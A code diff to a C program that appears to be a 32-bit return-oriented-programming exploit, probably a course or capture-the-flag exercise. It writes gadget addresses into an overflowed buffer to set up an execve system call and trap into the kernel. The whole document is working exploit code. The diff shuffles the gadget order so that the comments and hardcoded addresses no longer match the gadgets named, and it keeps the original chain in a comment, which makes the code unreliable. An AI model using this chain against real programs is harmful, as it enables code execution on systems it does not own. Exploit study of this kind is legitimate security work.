@@ -31,20 +31,20 @@ int main(void)
 
   // overwrite ebp
   // pop arg into edx
-  strcpy(bufr + 131, pop_edx); // 0xbbb9dc1b
-  strcpy(bufr + 135, exec_arg);
+  strcpy(bufr + 131, xor_edx); // 0xbbb9dc1b
+  strcpy(bufr + 135, pop_ecx);
   // clear eax
-  strcpy(bufr + 139, xor_eax); // 0xbba9b3c2
+  strcpy(bufr + 139, null_arg_addr); // 0xbba9b3c2
   // add last 8 bits of edx to eax
-  strcpy(bufr + 143, add_dl_al); // 0xbbbb4607
+  strcpy(bufr + 143, write_at_ecx_from_edx); // 0xbbbb4607
                                  // eax now holds 0x3b (59)
   // clear edx 
-  strcpy(bufr + 147, xor_edx); // 0xbbb3bed4
+  strcpy(bufr + 147, pop_edx); // 0xbbb3bed4
   // pop null args address into ecx
-  strcpy(bufr + 151, pop_ecx); // 0xbbbaa422
-  strcpy(bufr + 155, null_arg_addr); // = 0xbfbf588c
+  strcpy(bufr + 151, exec_arg); // 0xbbbaa422
+  strcpy(bufr + 155, xor_eax); // = 0xbfbf588c
   // write 4 bytes of null to address in ecx
-  strcpy(bufr + 159, write_at_ecx_from_edx); // 0xbbb6b87e
+  strcpy(bufr + 159, add_dl_al); // 0xbbb6b87e
                                              // null arg should be present
   // trap into kernel
   strcpy(bufr + 163, trap); // 0xbba9b6e5
@@ -65,3 +65,23 @@ int main(void)
 }
 // esp: 0xbfbf57d8 -> 08048be8
 // buf: 0xbfbf57e5
+
+/*
+  // overwrite ebp
+  // pop arg into edx
+  strcpy(bufr + 131, pop_edx); // 0xbbb9dc1b
+  strcpy(bufr + 135, exec_arg);
+  // clear eax
+  strcpy(bufr + 139, xor_eax); // 0xbba9b3c2
+  // add last 8 bits of edx to eax
+  strcpy(bufr + 143, add_dl_al); // 0xbbbb4607
+                                 // eax now holds 0x3b (59)
+  // clear edx 
+  strcpy(bufr + 147, xor_edx); // 0xbbb3bed4
+  // pop null args address into ecx
+  strcpy(bufr + 151, pop_ecx); // 0xbbbaa422
+  strcpy(bufr + 155, null_arg_addr); // = 0xbfbf588c
+  // write 4 bytes of null to address in ecx
+  strcpy(bufr + 159, write_at_ecx_from_edx); // 0xbbb6b87e
+                                             // null arg should be present
+  */
